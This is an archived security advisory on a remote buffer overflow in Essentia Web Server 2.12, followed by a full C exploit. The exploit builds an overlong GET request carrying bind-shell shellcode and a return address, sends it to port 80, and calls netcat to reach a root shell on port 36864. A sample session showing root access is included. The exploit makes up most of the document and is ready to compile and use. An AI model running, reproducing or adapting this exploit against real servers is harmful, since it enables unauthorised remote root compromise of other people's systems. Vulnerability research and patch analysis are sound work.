source: http://www.securityfocus.com/bid/4159/info

Essentia Web Server is a multi-threaded HTTP server designed for Microsoft Windows and Linux environments. Essentia is maintained by Essen.

Essentia is prone to a remote denial of service. This condition may be triggered by submitting an excessively long URL (2000+ bytes). Successful exploitation will deny service to legitimate users and will require that the webserver be restarted to regain normal functionality.

This problem is due to a lack of bounds-checking on the length of URLs. Because of this, an attacker may also be able to exploit this condition to execute arbitrary code.

This issue was reported for Essentia Web Sever v2.1; earlier versions may also be affected. 

/*

	Title:		Remote Buffer Overflow in Essentia Webserver.
	Author:		By B-r00t <br00t@blueyonder.co.uk>

	Date:		04/07/2003
	Reference:	http://www.essencomp.com/
	Versions:	Essentia Web Server 2.12 (Linux) => VULNERABLE
	Related Info:	http://www.securityfocus.com/bid/4159/info/

	Exploit:	essenexploit.c
	Compile:	gcc -o essenexploit essenexploit.c
			Exploit binds a r00tshell to port 36864.
			Tested on Redhat 7.2 & 7.1
			THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY!



$ telnet 0 80
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Fri, 04 Jul 2003 11:19:39 GMT
Server: Essentia Web Server 2.12 (Linux)
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Type: text/html
Content-Length: 757
ETag: "f104b5-5f2-0b7940f3"
Last-Modified: Thu, 03 Jul 2003 20:53:04 GMT

Connection closed by foreign host.



$ ./essenexploit 127.0.0.1
essenexploit by B-r00t <br00t@blueyonder.co.uk>. (c) 2003

Number of bytes sent: 2057 / 2057

Using netcat 'nc' to get the r00tshell on port 36864 ....!!!!!
localhost.localdomain [127.0.0.1] 36864 (?) open
uname -a; id;
Linux RedHat7-2 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)



ENJOY!
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define EXPLOIT "essenexploit"
#define DEST_PORT 80
#define NOP "A"

int main ( int argc, char *argv[] )
{

// Vars 
int socketfd, loop, bytes;
struct sockaddr_in dest_addr;
char *TARGET = "TARGET";
char buf[2100], *ptr;
// Big fat slide NOP so ret should be good everywhere!
char ret[] = "\xe8\xc5\xff\xbe\xe8\xc5\xff\xbe";
char shellcode[] =
"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
"\x40\x89\xc3\x89\x46\x0c\x40\x89"
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
"\x80\x43\xc6\x46\x10\x10\x88\x46"
"\x08\x31\xc0\x31\xd2\x89\x46\x18"
"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
"\x56\x10\xb0\x66\x43\xcd\x80\x86"
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
"\x80\x88\x56\x07\x89\x76\x0c\x87"
"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


printf ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\n", EXPLOIT);

if (argc < 2) 
{
        printf ("\nUsage: %s [IP_ADDRESS]", EXPLOIT);
        printf ("\nExample: %s 10.0.0.1 \n", EXPLOIT);
        printf ("\nOn success a r00tshell will be spawned on port 36864.\n\n");
        exit (-1);
}

setenv (TARGET, argv[1], 1);

// Build buf
memset (buf, '\0', sizeof (buf));
ptr = buf;
strcat (buf, "GET /");

for (loop = 1; loop < 2033-sizeof(shellcode); loop++) 
strcat (buf, NOP);

strcat (buf, shellcode);
strcat (buf, ret);
strcat (buf, " HTTP/1.0");
strcat (buf, "\x0D\x0A\x0D\x0A");

// Socket
if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror("\nsocket error\n");
        exit (1);
        }

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DEST_PORT);
if (! inet_aton(argv[1], &(dest_addr.sin_addr))) {
        perror("inet_aton problems");
        exit (2);
        }

memset( &(dest_addr.sin_zero), '\0', 8);

if (connect (socketfd, (struct sockaddr *)&dest_addr, sizeof (struct sockaddr)) == -1){
        perror("\nconnect failed\n");
        close (socketfd);
        exit (3);
        }

// Wallop!
bytes = (send (socketfd, ptr, strlen(buf), 0));
if (bytes == -1) {
        perror("\nsend error\n");
        close (socketfd);
        exit(4);
        }
close (socketfd);
if (bytes < strlen(buf))
printf ("\nNetwork Error - Full Payload Was NOT sent!");

printf ("\n\nNumber of bytes sent: %d / %d\n", bytes, strlen(buf));
printf ("\nUsing netcat 'nc' to get the r00tshell on port 36864 ...!\n");
sleep (3);
system("nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'");
exit (0);
} // end main

/*

Shoutz: Marshal-l, Rux0r, blunt, macavity, Monkfish
	Rewd, Maz. That One Doris ... U-Know-Who-U-R!
	The doris.scriptkiddie.net posse.

Author:	B-r00t aka B#. 2003. <br00t@blueyonder.co.uk> (c)
	"If You Can't B-r00t Then Just B#."

	ENJOY! 
*/ 